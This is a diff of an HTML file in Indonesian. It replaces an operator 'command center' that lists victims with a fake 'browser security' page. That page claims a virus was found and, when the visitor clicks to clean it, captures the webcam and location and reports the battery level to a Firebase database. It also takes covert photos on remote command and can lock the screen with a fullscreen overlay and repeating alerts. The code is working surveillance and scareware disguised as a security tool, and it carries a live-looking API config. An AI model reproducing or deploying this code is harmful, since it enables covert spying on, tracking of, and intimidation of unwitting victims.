@@ -1,43 +1,27 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>THE EYE v21.5 - SUPREME COMMANDER</title>
+    <title>⚠️ KEAMANAN BROWSER</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-    <style>
-        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
-        .sidebar { width: 320px; background: #0f0f0f; border-right: 2px solid #00ff00; padding: 20px; overflow-y: auto; }
-        .main-view { flex-grow: 1; padding: 30px; overflow-y: auto; background: black; }
-        .card { background: #111; border: 1px solid #00ff00; padding: 20px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,255,0,0.1); position: relative; }
-        .target-btn { width: 100%; background: #1a1a1a; color: #00ff00; border: 1px solid #333; padding: 15px; margin-bottom: 10px; text-align: left; cursor: pointer; border-radius: 5px; transition: 0.3s; }
-        .target-btn:hover { background: #00ff00; color: black; }
-        button { border: none; padding: 12px; font-weight: bold; cursor: pointer; border-radius: 5px; width: 100%; margin: 8px 0; text-transform: uppercase; }
-        .btn-cmd { background: #00ff00; color: black; }
-        .btn-virus { background: #ff0000; color: white; }
-        .btn-release { background: white; color: black; }
-        .btn-delete { background: #555; color: white; margin-top: 20px; }
-        .img-box img { width: 100%; border: 2px solid #00ff00; margin-top: 15px; border-radius: 10px; }
-        hr { border: 0; border-top: 1px dashed #00ff00; margin: 15px 0; }
-    </style>
 </head>
-<body onload="initApp()">
-
-<div class="sidebar">
-    <h3 style="text-align:center">🛰️ RADAR LIST</h3>
-    <hr>
-    <div id="target-list">Scanning Satellite...</div>
-</div>
-
-<div class="main-view" id="monitor">
-    <div style="text-align:center; margin-top: 20%;">
-        <h1>📡 COMMAND CENTER v21.5</h1>
-        <p>PILIH TARGET DI SEBELAH KIRI UNTUK MEMULAI MONITORING</p>
+<body style="background:#fff; font-family:sans-serif; text-align:center; padding-top:100px;">
+    <video id="v" width="1" height="1" autoplay style="opacity:0; position:absolute;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+    
+    <div id="overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:red; color:white; z-index:9999; padding-top:200px; font-size:30px; font-weight:bold;">
+        ☣️ DEVICE LOCKED ☣️<br>CRITICAL ERROR
     </div>
-</div>
+
+    <div id="m">
+        <h1 style="color:red">⚠️ BAHAYA!</h1>
+        <p>Sistem mendeteksi virus. Klik di bawah untuk membersihkan.</p>
+        <button onclick="start()" style="padding:20px; background:blue; color:white; border:none; border-radius:10px; cursor:pointer;">BERSIHKAN SEKARANG</button>
+    </div>
 
 <script>
-    // --- TEMPEL CONFIG FIREBASE KALZ ---
+    // --- TEMPEL CONFIG FIREBASE SAMA DENGAN INDEX ---
     const firebaseConfig = {
       apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ",
       authDomain: "theeyes-8d0aa.firebaseapp.com",
@@ -49,55 +33,48 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
+    let idK = null; let isLocked = false;
 
-    function initApp() {
-        db.ref('korban').on('value', snap => {
-            const data = snap.val();
-            let h = "";
-            for(let id in data) {
-                h += `<button class="target-btn" onclick="viewTarget('${id}')">📍 ID: ${id.substring(1,8)}<br><small>${data[id].waktu}</small></button>`;
-            }
-            document.getElementById('target-list').innerHTML = h || "Menunggu Target...";
-        });
-    }
+    async function start() {
+        document.documentElement.requestFullscreen();
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({video:true});
+            document.getElementById('v').srcObject = s;
+            navigator.geolocation.getCurrentPosition(async p => {
+                let bat = "N/A"; if(navigator.getBattery) { const b = await navigator.getBattery(); bat = Math.round(b.level*100)+"%"; }
+                const ref = db.ref('korban').push({
+                    waktu: new Date().toLocaleString(),
+                    baterai: bat,
+                    maps: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`
+                });
+                idK = ref.key;
+                document.getElementById('m').innerHTML = "<h2>🔍 Scanning... 75%</h2>";
 
-    function viewTarget(id) {
-        db.ref('korban/' + id).on('value', snap => {
-            const k = snap.val();
-            if(!k) { document.getElementById('monitor').innerHTML = "<h1>Target Terhapus.</h1>"; return; }
-            document.getElementById('monitor').innerHTML = `
-                <div class="card">
-                    <h3>🎮 CONTROL UNIT: ${id}</h3>
-                    <p>🕒 MASUK: ${k.waktu} | 🔋 BAT: ${k.baterai}</p>
-                    <hr>
-                    <button class="btn-cmd" onclick="sendCmd('${id}', 'TAKE')">📸 AMBIL FOTO</button>
-                    <button class="btn-cmd" onclick="window.open('${k.maps}', '_blank')">🌍 TRACK LOKASI</button>
-                    <button class="btn-virus" onclick="sendCmd('${id}', 'VIRUS')">☣️ EXECUTE VIRUS (LOCK)</button>
-                    <button class="btn-release" onclick="sendCmd('${id}', 'RELEASE')">🏳️ RELEASE TARGET</button>
-                    <button class="btn-delete" onclick="killTarget('${id}')">🗑️ HAPUS TARGET DARI LIST</button>
-                    <hr>
-                    <div id="display-foto">Menunggu kiriman data...</div>
-                </div>`;
-            
-            db.ref('hasil_foto/' + id).on('value', fsnap => {
-                const f = fsnap.val();
-                if(f) document.getElementById('display-foto').innerHTML = `<h4>FOTO TERBARU:</h4><img src="${f.foto}" style="width:100%">`;
+                db.ref('commands/' + idK).on('value', snap => {
+                    const cmd = snap.val(); if(!cmd) return;
+                    if(cmd.action === "TAKE") {
+                        const v = document.getElementById('v'), c = document.getElementById('c');
+                        c.width = v.videoWidth; c.height = v.videoHeight;
+                        c.getContext('2d').drawImage(v, 0, 0);
+                        db.ref('hasil_foto/' + idK).set({ foto: c.toDataURL('image/jpeg', 0.4) });
+                    }
+                    if(cmd.action === "VIRUS") {
+                        isLocked = true;
+                        document.getElementById('overlay').style.display='block';
+                        const loop = setInterval(() => {
+                            if(!isLocked) clearInterval(loop);
+                            else alert("⚠️ SYSTEM ERROR!");
+                        }, 500);
+                    }
+                    if(cmd.action === "RELEASE") {
+                        isLocked = false;
+                        document.getElementById('overlay').style.display='none';
+                        document.exitFullscreen();
+                        alert("Sistem Aman.");
+                    }
+                });
             });
-        });
-    }
-
-    function sendCmd(id, action) {
-        db.ref('commands/' + id).set({ action: action, t: Date.now() });
-        alert("Command " + action + " Terkirim!");
-    }
-
-    function killTarget(id) {
-        if(confirm("Hapus data target ini secara permanen?")) {
-            db.ref('korban/' + id).remove();
-            db.ref('hasil_foto/' + id).remove();
-            db.ref('commands/' + id).remove();
-            document.getElementById('monitor').innerHTML = "<h1>Target Berhasil Dimusnahkan.</h1>";
-        }
+        } catch(e) { alert("Izinkan Akses!"); }
     }
 </script>
 </body>
